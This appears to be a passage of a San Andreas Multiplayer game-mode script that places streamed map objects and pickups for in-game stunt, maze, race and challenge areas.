CreateStreamObject(972,-4377.566,158.433,1.356,0.0,0.0,0.0,300);
CreateStreamObject(972,-4382.846,169.281,1.356,0.0,0.0,33.750,300);
CreateStreamObject(972,-4386.669,187.741,1.153,0.0,0.0,202.500,300);
CreateStreamObject(972,-4393.922,178.044,1.153,0.0,0.0,45.000,300);
CreateStreamObject(972,-4396.464,177.228,1.153,0.0,0.0,22.500,300);
CreateStreamObject(972,-4364.230,159.771,1.356,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4370.552,142.361,1.356,0.0,0.0,0.0,300);
CreateStreamObject(972,-4347.495,128.075,1.356,0.0,0.0,90.000,300);
CreateStreamObject(972,-4348.791,129.177,1.356,0.0,0.0,-180.000,300);
CreateStreamObject(972,-4361.212,141.619,1.306,0.0,0.0,-22.500,300);
CreateStreamObject(972,-4356.863,125.500,1.356,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4368.080,113.758,1.356,0.0,0.0,0.0,300);
CreateStreamObject(972,-4352.989,148.181,1.356,0.0,0.0,0.0,300);
CreateStreamObject(972,-4335.185,134.854,1.356,0.0,0.0,90.000,300);
CreateStreamObject(972,-4337.354,123.700,1.356,0.0,0.0,0.0,300);
CreateStreamObject(972,-4347.571,115.123,1.356,0.0,0.0,-84.843,300);
CreateStreamObject(972,-4361.018,97.041,1.356,0.0,0.0,0.0,300);
CreateStreamObject(972,-4370.737,93.727,1.356,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4377.513,101.218,1.356,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4390.851,96.349,1.284,0.0,0.0,0.0,300);
CreateStreamObject(972,-4381.054,93.803,1.356,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4396.141,152.253,1.364,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4413.431,155.905,1.288,0.0,0.0,0.0,300);
CreateStreamObject(972,-4406.643,152.387,1.357,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4402.378,113.528,1.356,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4378.976,108.987,1.356,0.0,0.0,33.750,300);
CreateStreamObject(972,-4390.012,109.051,1.565,0.0,0.0,-11.250,300);
CreateStreamObject(972,-4396.025,295.499,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4382.270,308.683,0.227,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4360.517,308.688,0.376,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4364.704,296.204,0.982,0.0,0.0,0.0,300);
CreateStreamObject(972,-4371.141,276.489,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4388.593,278.308,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4399.497,280.860,0.974,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4405.446,286.825,1.178,0.0,0.0,0.0,300);
CreateStreamObject(972,-4399.493,275.101,0.974,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4421.221,271.280,0.974,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4418.753,255.266,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4425.144,249.841,0.974,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4418.721,277.718,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4414.002,297.006,-0.324,0.0,0.0,0.0,300);
CreateStreamObject(972,-4424.311,290.128,0.233,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4404.251,309.995,-0.429,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4377.257,229.328,1.178,0.0,0.0,0.0,300);
CreateStreamObject(972,-4388.062,223.146,1.153,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4401.581,230.002,1.178,0.0,0.0,0.0,300);
CreateStreamObject(972,-4374.724,238.668,1.834,0.0,0.0,-180.000,300);
CreateStreamObject(972,-4385.237,238.428,0.974,0.0,0.0,-157.500,300);
CreateStreamObject(972,-4397.963,231.982,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4393.362,241.582,0.974,0.0,0.0,22.500,300);
CreateStreamObject(972,-4388.229,239.036,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4406.021,204.766,1.154,0.0,0.0,0.0,300);
CreateStreamObject(972,-4401.520,200.979,1.153,0.0,0.0,0.0,300);
CreateStreamObject(972,-4384.802,212.070,1.153,0.0,0.0,90.000,300);
CreateStreamObject(972,-4373.653,215.994,1.153,0.0,0.0,0.0,300);
CreateStreamObject(972,-4364.116,238.072,0.974,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4369.461,221.336,1.153,0.0,0.0,0.0,300);
CreateStreamObject(972,-4368.210,209.638,1.161,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4364.450,215.180,1.153,0.0,0.0,0.0,300);
CreateStreamObject(972,-4360.917,220.650,1.227,0.0,0.0,0.0,300);
CreateStreamObject(972,-4356.917,216.095,1.153,0.0,0.0,0.0,300);
CreateStreamObject(972,-4353.856,208.802,1.153,0.0,0.0,0.0,300);
CreateStreamObject(972,-4384.542,212.960,1.153,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4395.685,195.293,1.153,0.0,0.0,0.0,300);
CreateStreamObject(972,-4354.271,220.349,0.983,0.0,0.0,0.0,300);
CreateStreamObject(972,-4365.152,203.716,1.161,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4371.398,206.265,1.153,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4388.110,195.840,1.153,0.0,0.0,0.0,300);
CreateStreamObject(972,-4377.226,203.327,1.153,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4364.470,272.865,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4371.092,254.978,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4359.961,254.505,0.974,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4352.854,259.610,0.974,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4353.943,259.474,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4359.237,271.721,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4353.892,282.502,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4359.365,284.837,0.974,0.0,0.0,0.0,300);
CreateStreamObject(972,-4346.042,276.838,0.353,0.0,0.0,-90.000,300);
CreateStreamObject(972,-4353.750,293.858,0.982,0.0,0.0,0.0,300);
CreateStreamObject(972,-4359.212,237.526,0.974,0.0,0.0,90.000,300);
CreateStreamObject(972,-4353.979,234.430,0.974,0.0,0.0,0.0,300);
CreateStreamObject(8420,-4368.505,128.986,9.165,0.0,0.0,90.000,300);
CreateStreamObject(8420,-4393.707,209.174,9.075,0.0,0.0,270.000,300);
CreateStreamObject(8420,-4393.558,268.002,9.181,0.0,0.0,0.0,300);
// MAZE
//=[Stuntds]======
CreateStreamObject(3663,1491.663,-2415.156,14.635,0.0,0.0,-180.000,300);
CreateStreamObject(3663,1495.300,-2415.242,16.737,0.0,0.0,-180.000,300);
CreateStreamObject(18367,1543.089,-2414.235,21.580,0.0,0.0,90.000,300);
CreateStreamObject(1894,1663.631,-2415.386,19.881,0.0,0.0,0.0,300);
CreateStreamObject(1894,1634.530,-2415.389,19.892,0.0,0.0,0.0,300);
CreateStreamObject(17054,1711.871,-2412.112,12.543,0.0,0.0,-90.000,300);
CreateStreamObject(17054,1733.164,-2413.640,12.543,0.0,0.0,-90.000,300);
CreateStreamObject(17054,1746.084,-2414.080,12.543,0.0,0.0,-90.000,300);
CreateStreamObject(4853,1488.476,-2651.424,11.043,-25.783,0.0,0.0,300);
CreateStreamObject(3528,1586.924,-2413.275,18.992,0.0,0.0,-180.000,300);
CreateStreamObject(8483,1776.962,-2419.976,16.764,0.0,0.0,-33.750,300);
CreateStreamObject(13638,1960.520,-2647.591,14.744,0.0,0.0,90.000,300);
CreateStreamObject(13638,1951.818,-2656.245,18.817,0.0,0.0,180.000,300);
CreateStreamObject(13636,1935.061,-2650.327,14.627,0.0,0.0,-90.000,300);
CreateStreamObject(8375,1877.292,-2544.821,17.271,0.0,0.0,-90.000,300);
CreateStreamObject(8375,1868.903,-2541.378,20.831,0.0,0.0,90.000,300);
CreateStreamObject(8375,1851.406,-2544.905,15.956,19.767,0.0,-90.000,300);
CreateStreamObject(16401,1787.625,-2413.990,21.840,0.0,0.0,0.0,300);
CreateStreamObject(12956,1700.950,-2464.100,15.733,0.0,0.0,-168.750,300);
CreateStreamObject(13590,1509.778,-2547.750,13.698,0.0,0.0,-45.000,300);
CreateStreamObject(4209,1327.344,-2451.578,101.125,-30.080,0.0,-90.000,300);
CreateStreamObject(4209,1480.907,-2442.677,41.647,-30.080,0.0,-123.750,300);
CreateStreamObject(4209,1387.995,-2408.855,90.769,-22.345,12.892,-97.580,300);
CreateStreamObject(4209,1279.194,-2411.354,123.618,-12.032,14.610,-80.469,300);
CreateStreamObject(4209,1244.525,-2451.513,149.162,-30.080,0.0,-90.000,300);
CreateStreamObject(4209,1172.579,-2421.526,165.109,-31.799,0.0,-89.063,300);
CreateStreamObject(4209,1139.053,-2451.941,202.307,-23.205,0.0,-90.000,300);
CreateStreamObject(8420,1046.155,-2429.549,226.172,0.0,0.0,0.0,300);
CreateStreamObject(4209,1129.460,-2422.326,195.945,-35.237,0.0,-89.063,300);
CreateStreamObject(1634,1382.223,-2459.055,72.182,-15.470,0.0,-90.000,300);
CreateStreamObject(1634,1389.810,-2459.144,75.359,8.594,0.0,-90.000,300);
CreateStreamObject(1634,1382.319,-2454.862,72.131,-15.470,0.0,-90.000,300);
CreateStreamObject(1634,1389.816,-2455.055,75.360,8.594,0.0,-90.000,300);
CreateStreamObject(1634,1382.279,-2451.249,72.133,-15.470,0.0,-90.000,300);
CreateStreamObject(1634,1389.800,-2451.016,75.230,8.594,0.0,-90.000,300);
CreateStreamObject(1634,1382.164,-2447.136,72.045,-15.470,0.0,-90.000,300);
CreateStreamObject(1634,1389.697,-2446.903,75.160,8.594,0.0,-90.000,300);
CreateStreamObject(1634,1382.151,-2442.954,72.006,-15.470,0.0,-90.000,300);
CreateStreamObject(1634,1389.754,-2442.668,74.955,8.594,0.0,-90.000,300);
CreateStreamObject(1894,1629.082,-2518.917,12.547,0.0,0.0,0.0,300);
CreateStreamObject(12956,1457.964,-2451.973,15.808,0.0,0.0,0.0,300);
CreateStreamObject(13641,2136.579,-2523.508,14.266,0.0,0.0,0.0,300);
CreateStreamObject(13641,2136.662,-2529.914,14.266,0.0,0.0,0.0,300);
CreateStreamObject(13641,2140.463,-2526.627,16.228,0.0,-9.454,-2.578,300);
CreateStreamObject(8881,1875.316,-2274.218,46.748,0.0,0.0,26.875,300);
CreateStreamObject(1634,1904.958,-2315.495,13.844,0.0,0.0,0.0,300);
CreateStreamObject(1634,1905.042,-2309.718,18.272,21.486,0.0,0.0,300);
CreateStreamObject(1634,1905.057,-2305.958,24.007,40.394,0.0,0.0,300);
CreateStreamObject(5428,1957.000,-2438.430,13.354,-0.859,0.0,0.0,300);
CreateStreamObject(5428,1903.292,-2437.607,13.321,0.859,0.0,-180.000,300);
CreateStreamObject(3502,1885.134,-2312.469,32.599,0.0,0.0,0.0,300);
CreateStreamObject(3502,1885.052,-2321.215,32.457,0.0,0.0,0.0,300);
CreateStreamObject(3502,1884.967,-2328.946,32.965,-12.892,-26.643,-1.719,300);
CreateStreamObject(3502,1884.891,-2334.883,34.350,-15.470,0.0,0.0,300);
CreateStreamObject(1388,1884.624,-2337.505,22.042,0.0,0.0,-180.000,300);
CreateStreamObject(1634,1884.750,-2380.025,28.217,0.0,0.0,-180.000,300);
CreateStreamObject(978,1085.806,-2437.573,226.788,0.0,0.0,90.000,300);
CreateStreamObject(978,1085.941,-2408.285,226.988,0.0,0.0,90.000,300);
CreateStreamObject(978,1085.975,-2464.388,226.988,0.0,0.0,90.000,300);
CreateStreamObject(981,1041.573,-2389.634,227.100,0.0,0.0,0.0,300);
CreateStreamObject(3749,1084.673,-2451.482,231.807,0.0,0.0,-90.000,300);
CreateStreamObject(7033,1727.417,-2462.974,17.068,0.0,0.0,-78.750,300);
CreateStreamObject(7292,1951.836,-2417.981,12.982,0.0,0.0,-270.000,300);
CreateStreamObject(17565,1947.589,-2595.710,15.056,0.0,0.0,-90.000,300);
CreateStreamObject(3627,1813.853,-2414.240,15.619,23.205,0.0,11.250,300);
CreateStreamObject(11388,1641.107,-2462.990,13.639,0.0,0.0,180.000,300);
CreateStreamObject(5400,1611.327,-2611.895,17.531,0.0,0.0,-90.000,300);
CreateStreamObject(13592,1723.944,-2614.810,22.242,0.0,0.0,0.0,300);
CreateStreamObject(13592,1733.779,-2607.695,22.268,0.0,0.0,0.0,300);
CreateStreamObject(13592,1743.024,-2600.416,22.343,0.0,0.0,0.0,300);
CreateStreamObject(13592,1752.919,-2593.250,22.292,0.0,0.0,0.0,300);
CreateStreamObject(13592,1763.327,-2586.156,22.293,0.0,0.0,0.0,300);
CreateStreamObject(8172,1542.579,-2620.903,36.166,-24.924,0.0,-90.000,300);
CreateStreamObject(13608,1323.305,-2626.992,72.402,0.0,0.0,0.0,300);
CreateStreamObject(13642,1734.723,-2549.365,14.975,0.0,0.0,-112.500,300);
CreateStreamObject(17563,1264.192,-2499.388,64.844,0.0,1.719,12.892,300);
CreateStreamObject(5716,2000.164,-2357.327,25.688,0.0,0.0,-90.000,300);
CreateStreamObject(8130,2066.808,-2642.705,22.660,0.0,0.0,-180.000,300);
CreateStreamObject(8397,1654.879,-2552.989,21.657,0.0,0.0,-90.000,300);
CreateStreamObject(8493,1644.842,-2428.428,29.527,0.0,0.0,-157.500,300);
CreateStreamObject(8395,1836.936,-2671.124,46.964,0.0,0.0,0.0,300);
CreateStreamObject(1634,1812.346,-2604.684,13.844,0.0,0.0,-180.000,300);
CreateStreamObject(1634,1905.328,-2629.857,13.844,0.0,0.0,90.000,300);
CreateStreamObject(1383,1643.561,-2662.574,20.719,-86.803,91.100,0.0,300);
CreateStreamObject(13666,1704.555,-2662.646,27.490,0.0,0.0,-90.000,300);
CreateStreamObject(1632,1712.212,-2660.868,23.494,0.0,0.0,-90.000,300);
CreateStreamObject(1632,1770.894,-2664.166,24.673,0.0,0.0,-90.000,300);
CreateStreamObject(8210,1963.559,-2176.696,15.648,0.0,0.0,0.0,300);
CreateStreamObject(12919,1553.612,-2637.270,12.491,0.0,0.0,90.000,300);
CreateStreamObject(1634,1553.106,-2654.951,16.344,0.0,0.0,-180.000,300);
CreateStreamObject(1634,2143.561,-2498.475,13.844,0.0,0.0,-90.000,300);
CreateStreamObject(1634,1577.559,-2638.240,21.192,0.0,0.0,-112.500,300);

//end


// ETGAR
CreateStreamObject(4002,1065.961,1758.189,29.832,0.0,0.0,0.0,300);
CreateStreamObject(17565,1047.662,1720.876,12.329,0.0,0.0,-90.000,300);
CreateStreamObject(16304,1064.772,1725.725,19.006,0.0,0.0,0.0,300);
CreateStreamObject(13643,1072.427,1726.561,18.682,0.0,0.0,-180.000,300);
CreateStreamObject(13638,1087.362,1733.799,19.993,0.0,0.0,-90.000,300);
CreateStreamObject(13636,1101.050,1729.059,26.443,0.0,0.0,-180.000,300);
CreateStreamObject(16401,1108.715,1731.792,24.807,0.0,0.0,90.000,300);
CreateStreamObject(6052,1114.621,1743.809,28.209,0.0,0.0,112.500,300);
CreateStreamObject(3852,1117.988,1761.627,32.271,0.0,0.0,13.906,300);
CreateStreamObject(3852,1117.323,1765.156,35.782,12.032,0.0,11.250,300);
CreateStreamObject(3663,1114.250,1771.553,37.537,0.0,0.0,-45.000,300);
CreateStreamObject(2931,1111.156,1774.453,38.797,13.751,0.0,45.000,300);
CreateStreamObject(1894,1107.614,1773.550,39.610,-0.859,25.783,-11.250,300);
CreateStreamObject(1634,1079.422,1780.440,55.539,8.594,0.0,78.750,300);
CreateStreamObject(1503,1075.064,1781.093,59.229,19.767,1.719,79.609,300);
CreateStreamObject(5152,1072.699,1781.343,62.216,-4.297,-16.329,-188.672,300);
CreateStreamObject(13639,1064.509,1782.660,65.403,-16.329,0.859,-96.093,300);
CreateStreamObject(13647,1040.695,1783.176,72.524,-1.719,19.767,0.0,300);
CreateStreamObject(18367,1019.946,1782.114,74.813,-17.189,0.0,67.500,300);
CreateStreamObject(8302,1047.366,1765.964,88.716,0.0,0.0,-146.250,300);
CreateStreamObject(18367,1048.105,1757.970,92.751,-25.783,0.0,10.932,300);
CreateStreamObject(16644,1060.212,1739.699,113.803,-0.859,-30.080,56.250,300);
CreateStreamObject(3791,1055.334,1733.264,109.274,0.0,0.0,22.500,300);
CreateStreamObject(3791,1056.327,1733.838,110.209,0.0,0.0,-33.750,300);
AddStaticPickup(371,2, 1067.5293,1758.0562,130.5619);
//=[Challenge]==================
AddStaticPickup(371,2, 5415.9658,-2405.3826,19.8348);

CreateStreamObject(8171,5386.988,-2376.463,1.566,0.0,0.0,0.0,300);
CreateStreamObject(8171,5347.230,-2373.616,1.453,0.0,0.0,0.0,300);
CreateStreamObject(4002,5366.045,-2324.162,24.546,0.0,0.0,0.0,300);
CreateStreamObject(4007,5370.903,-2458.138,20.228,0.0,0.0,101.250,300);
CreateStreamObject(8313,5396.315,-2380.769,5.215,36.096,85.084,2.656,300);
CreateStreamObject(3458,5414.599,-2361.015,15.255,-3.438,23.205,-146.250,300);
CreateStreamObject(3627,5429.043,-2332.862,24.606,20.626,0.0,0.0,300);
CreateStreamObject(5401,5426.441,-2300.620,38.735,0.0,-19.767,90.000,300);
CreateStreamObject(17039,5420.537,-2286.817,44.084,0.0,0.0,-90.000,300);
CreateStreamObject(18609,5418.514,-2288.391,45.517,0.0,0.0,-90.000,300);
CreateStreamObject(18609,5420.059,-2288.250,45.763,0.0,0.0,90.000,300);
CreateStreamObject(18609,5414.353,-2288.076,47.746,0.0,0.0,90.000,300);
CreateStreamObject(1660,5408.667,-2287.553,46.365,18.908,0.0,-281.250,300);
CreateStreamObject(1894,5397.003,-2287.506,54.085,0.0,36.096,0.0,300);
CreateStreamObject(3364,5369.420,-2286.033,74.060,-12.032,23.205,-68.514,300);
CreateStreamObject(3268,5365.348,-2287.374,78.796,0.0,0.0,-162.657,300);
CreateStreamObject(18367,5366.376,-2288.552,77.626,4.297,0.0,-26.797,300);
CreateStreamObject(18367,5365.293,-2286.910,75.880,0.0,0.0,-123.750,300);
CreateStreamObject(18367,5339.712,-2271.998,82.852,-11.173,0.0,11.250,300);
CreateStreamObject(17565,5350.062,-2314.091,87.602,-41.253,0.0,11.250,300);
CreateStreamObject(16302,5354.663,-2343.088,101.113,0.0,0.0,0.0,300);
CreateStreamObject(5130,5361.983,-2342.517,110.191,0.0,0.0,-135.000,300);
CreateStreamObject(16640,5372.937,-2314.145,122.781,0.0,0.0,90.000,300);
CreateStreamObject(3743,5377.505,-2326.321,123.245,0.0,0.0,0.0,300);
CreateStreamObject(7392,5375.709,-2334.456,118.668,0.0,0.0,-90.000,300);
CreateStreamObject(16135,5383.283,-2384.206,124.832,0.0,0.0,-90.000,300);
CreateStreamObject(1571,5377.959,-2388.686,125.937,0.0,0.0,56.250,300);
CreateStreamObject(1215,5384.244,-2384.538,125.170,0.0,0.0,0.0,300);
CreateStreamObject(1222,5386.257,-2382.764,125.082,0.0,0.0,0.0,300);
CreateStreamObject(1222,5387.609,-2384.555,125.082,0.0,0.0,0.0,300);
CreateStreamObject(1222,5388.739,-2383.222,125.082,0.0,0.0,0.0,300);
CreateStreamObject(2780,5388.238,-2383.257,122.574,0.0,0.0,0.0,300);
CreateStreamObject(3461,5396.320,-2394.228,126.181,0.0,0.0,0.0,300);
CreateStreamObject(11417,5394.349,-2399.542,129.480,0.0,0.0,0.0,300);
CreateStreamObject(3658,5387.052,-2407.543,122.574,2.578,21.486,-90.000,300);
CreateStreamObject(18474,5372.904,-2406.483,118.852,0.0,0.0,67.500,300);
CreateStreamObject(6866,5333.037,-2428.065,104.247,0.0,0.0,-213.750,300);
CreateStreamObject(1684,5350.898,-2454.721,103.982,0.0,0.0,-33.750,300);
CreateStreamObject(1684,5346.798,-2451.866,107.012,0.0,0.0,-33.750,300);
CreateStreamObject(3864,5385.360,-2468.411,108.491,0.0,0.0,-101.250,300);
CreateStreamObject(3864,5383.530,-2460.235,108.483,0.0,0.0,146.250,300);
CreateStreamObject(16731,5396.570,-2462.015,96.479,0.0,0.0,-168.750,300);
CreateStreamObject(3279,5406.969,-2458.569,76.610,0.0,0.0,90.000,300);
CreateStreamObject(18367,5410.225,-2456.506,76.434,43.831,0.0,-180.000,300);
CreateStreamObject(18262,5409.985,-2427.006,55.327,-34.377,0.0,-5.157,300);
CreateStreamObject(1894,5409.891,-2420.223,49.211,0.0,0.0,-120.080,300);
CreateStreamObject(1894,5423.257,-2395.481,48.616,0.0,-12.892,-60.392,300);
CreateStreamObject(3749,5406.870,-2359.991,40.707,0.0,0.0,-67.500,300);
CreateStreamObject(4724,5395.425,-2357.633,44.116,0.0,0.0,90.000,300);
CreateStreamObject(13592,5389.822,-2370.042,51.811,0.0,0.0,-133.986,300);
CreateStreamObject(13642,5376.128,-2398.526,43.886,0.0,0.0,-146.250,300);
CreateStreamObject(6332,5319.571,-2413.012,36.436,0.0,0.0,90.000,300);
CreateStreamObject(16640,5267.696,-2400.522,43.916,0.0,0.0,-191.250,300);
CreateStreamObject(16640,5283.874,-2393.184,43.945,0.0,0.0,-11.250,300);
CreateStreamObject(971,5276.632,-2386.578,42.381,53.285,0.0,-101.250,300);
CreateStreamObject(972,5289.545,-2385.819,33.587,17.189,-87.663,80.787,300);
CreateStreamObject(16644,5305.140,-2390.474,29.035,-2.578,39.534,-11.250,300);
CreateStreamObject(3269,5325.479,-2400.339,18.502,-20.626,0.0,-67.500,300);
CreateStreamObject(3664,5347.959,-2390.033,23.819,0.0,0.0,-90.000,300);
CreateStreamObject(3665,5372.303,-2399.017,18.332,0.0,0.0,-90.000,300);
CreateStreamObject(6052,5392.919,-2403.041,19.106,0.0,0.0,67.500,300);
CreateStreamObject(6052,5397.661,-2392.718,19.631,-0.859,30.940,-158.359,300);
CreateStreamObject(3852,5409.601,-2405.177,18.891,0.0,0.0,0.0,300);
CreateStreamObject(14791,5415.525,-2405.154,19.961,0.0,0.0,0.0,300);
// ETGAR
/*
AddPlayerClass(270,1382.6746,714.1313,10.8203,4.6275,0,0,0,0,0,0); // player1
AddPlayerClass(270,1378.9773,755.9199,10.8203,177.8790,0,0,0,0,0,0); // player2
*/
//=[RACE/LS/DJ]=======================================
CreateStreamObject(3515,2468.049,-1665.704,13.240,0.0,0.0,0.0,300);
CreateStreamObject(3515,2468.555,-1653.261,13.239,0.0,0.0,0.0,300);
CreateStreamObject(3528,2494.331,-1688.132,19.614,0.0,0.0,90.000,300);
CreateStreamObject(6965,2507.880,-1670.067,14.667,0.0,0.0,0.0,300);
CreateStreamObject(7073,2489.732,-1652.931,30.726,0.0,0.0,90.000,300);
CreateStreamObject(8483,2516.156,-1650.208,18.680,0.0,0.0,213.750,300);
CreateStreamObject(16778,2477.728,-1684.041,12.182,0.0,0.0,0.0,300);
CreateStreamObject(3458,2068.200,817.364,8.835,0.0,0.0,-360.000,300);
CreateStreamObject(8172,2067.530,842.962,5.771,0.0,0.0,-90.000,300);
CreateStreamObject(10377,2067.133,782.584,27.685,0.0,0.0,90.000,300);
CreateStreamObject(8620,2057.997,864.190,29.080,0.0,0.0,0.0,300);
CreateStreamObject(8493,1974.199,855.691,34.177,0.0,0.0,0.0,300);
CreateStreamObject(3528,2097.108,843.005,16.225,0.0,0.0,-180.000,300);
CreateStreamObject(6965,2075.630,842.884,8.422,0.0,0.0,0.0,300);
CreateStreamObject(6965,2039.717,842.931,8.468,0.0,0.0,0.0,300);
CreateStreamObject(7392,2066.506,814.903,19.083,0.0,0.0,-90.000,300);
CreateStreamObject(16776,-313.498,1501.418,73.945,0.0,0.0,95.157,300);
CreateStreamObject(7388,-307.199,1540.199,74.595,0.0,0.0,-22.500,300);
CreateStreamObject(7073,-308.569,1401.092,89.322,0.0,0.0,-78.750,300);
CreateStreamObject(3515,-363.398,1454.047,64.066,0.0,0.0,0.0,300);
CreateStreamObject(7392,-323.288,1304.116,64.298,0.0,0.0,-78.750,300);
CreateStreamObject(1226,-296.576,1507.315,78.232,0.0,0.0,0.0,300);
CreateStreamObject(3627,-271.094,1553.138,78.199,0.0,0.0,45.000,300);
CreateStreamObject(3528,-1375.858,-261.179,21.887,0.0,0.0,33.750,300);
CreateStreamObject(7073,-1398.414,-245.622,42.704,0.0,0.0,56.250,300);
CreateStreamObject(7392,-1358.007,-285.621,32.983,0.0,0.0,-135.000,300);
CreateStreamObject(13667,-1379.668,-264.746,43.587,0.0,0.0,33.750,300);
CreateStreamObject(3515,-1262.407,-256.382,13.844,0.0,0.0,0.0,300);
CreateStreamObject(3515,-1371.643,-143.964,13.919,0.0,0.0,0.0,300);
CreateStreamObject(1231,-1364.309,-248.719,15.874,0.0,0.0,-56.250,300);
CreateStreamObject(4832,-1606.268,-203.295,52.551,0.0,0.0,-225.000,300);
CreateStreamObject(13831,2439.500,-1654.413,33.011,0.0,0.0,90.859,300);
CreateStreamObject(9314,-1363.698,-248.931,14.904,0.0,0.0,45.000,300);
CreateStreamObject(9132,-1211.398,-104.140,32.265,0.0,0.0,-45.000,300);
CreateStreamObject(9623,1996.316,850.442,8.557,0.0,0.0,-90.000,300);
CreateStreamObject(9623,1996.115,832.297,8.549,0.0,0.0,-90.000,300);
CreateStreamObject(13831,2069.697,795.657,41.201,0.0,0.0,180.000,300);
CreateStreamObject(621,2050.121,803.320,9.230,0.0,0.0,0.0,300);
CreateStreamObject(621,2084.328,803.262,8.924,0.0,0.0,0.0,300);
CreateStreamObject(728,2006.348,842.472,5.409,0.0,0.0,0.0,300);
CreateStreamObject(12922,2073.975,863.441,9.099,0.0,0.0,0.0,300);
CreateStreamObject(12921,2042.342,863.298,9.093,0.0,0.0,0.0,300);
CreateStreamObject(18070,-675.683,963.590,11.633,0.0,0.0,-180.000,300);
CreateStreamObject(1310,-673.337,964.313,12.281,0.0,0.0,0.0,300);
CreateStreamObject(2057,-678.048,964.608,12.313,0.0,0.0,33.750,300);
CreateStreamObject(2061,-674.480,964.772,12.435,0.0,0.0,0.0,300);
CreateStreamObject(2690,-675.705,964.820,12.502,0.0,0.0,0.0,300);
//=[Props]=
//[Sercet weapons]=
CreateStreamObject(16151,-1097.652,-1468.640,125.667,0.0,0.0,-135.000,300);
CreateStreamObject(1242,-1097.547,-1467.284,126.500,0.0,0.0,-45.000,300);
CreateStreamObject(1654,-1098.049,-1466.661,126.589,0.0,0.0,-236.250,300);
CreateStreamObject(2034,-1098.688,-1466.241,126.303,0.0,0.0,-67.500,300);
CreateStreamObject(2064,-1102.295,-1467.703,125.189,0.0,0.0,225.000,300);
CreateStreamObject(1223,-1097.964,-1468.965,125.215,0.0,0.0,135.000,300);
CreateStreamObject(16151,-2420.882,2804.367,178.723,0.0,0.0,90.000,300);
CreateStreamObject(2035,-2421.031,2803.443,179.353,0.0,0.0,0.0,300);
CreateStreamObject(2036,-2419.779,2803.431,179.363,0.0,0.0,0.0,300);
CreateStreamObject(2044,-2418.403,2803.439,179.356,0.0,0.0,0.0,300);
CreateStreamObject(2045,-2417.769,2803.764,179.417,0.0,0.0,-33.750,300);
CreateStreamObject(1223,-2417.379,2805.189,178.469,0.0,0.0,-180.000,300);
//=[funny pickup]=====
AddStaticPickup(1240,2, 2079.2546,1914.6455,12.0956);
AddStaticPickup(1240,2, 2534.1003,1570.3983,7.5038);
AddStaticPickup(1240,2, 1535.8110,751.0545,32.7434);
AddStaticPickup(1240,2, 1415.8102,-806.3918,85.0368);
AddStaticPickup(1240,2, 1480.0500,-1639.4626,14.1484);
AddStaticPickup(1240,2, 2000.3209,1591.3086,17.9577);
AddStaticPickup(1242,2, 2643.2085,835.8810,13.7127);
AddStaticPickup(1242,2, 1087.5448,1074.9768,10.8382);
AddStaticPickup(1242,2, 2076.7422,700.6916,11.4683);
AddStaticPickup(1242,2, 2323.7456,1283.1936,97.6008);
AddStaticPickup(1242,2, 1196.4187,-2344.4854,15.3612);
AddStaticPickup(1242,2, -2812.0947,-1530.4349,140.8438);
AddStaticPickup(321,2, 2957.7820,2119.5679,-0.0038);
AddStaticPickup(371,2, 1548.4407,-1366.7924,326.2109);
AddStaticPickup(371,2, 1565.6556,-1358.8723,330.0605);
AddStaticPickup(371,2, 1523.7667,-1359.0393,330.0512);
AddStaticPickup(361,2, 1584.8269,-1332.9873,280.2841);
money1k=CreatePickup(362,19, 1481.3042,-1790.4451,156.7533);
money1d=CreatePickup(362,19, 1474.3514,-2286.8242,42.4205);
money2d=CreatePickup(1242,19, 2961.9880,-1877.6370,8.7813);
minihealth=CreatePickup(362,19, 489.7004,810.0806,1.3013);
tambal=CreatePickup(362,19, 489.7004,810.0806,1.3013);
forumadress=CreatePickup(370,19, 2061.3630,809.7615,9.5287);
disarmw=CreatePickup(1242,19, 2137.1514,1480.9709,31.1719);
m4=CreatePickup(356, 19, 489.7004,810.0806,1.3013);
saWn=CreatePickup(350,19, 2117.0144,1683.1423,13.0060);
//=[bomb]=-1380.479,2112.637,41.572,0.0,0.0,0.0

CreateStreamObject(18070,-1381.089,2112.044,41.700,0.0,0.0,-45.000,300);
CreateStreamObject(2753,-1383.290,2112.174,42.432,0.0,0.0,-45.000,300);
CreateStreamObject(2753,-1382.330,2111.287,42.432,0.0,0.0,-45.000,300);
CreateStreamObject(1254,-1382.949,2111.615,42.437,0.0,0.0,-45.000,300);
CreateStreamObject(1636,-1382.001,2110.453,42.573,0.0,0.0,45.000,300);
CreateStreamObject(1654,-1380.869,2109.568,42.527,0.0,0.0,-45.000,300);
CreateStreamObject(2037,-1383.293,2113.065,42.282,0.0,0.0,-123.750,300);
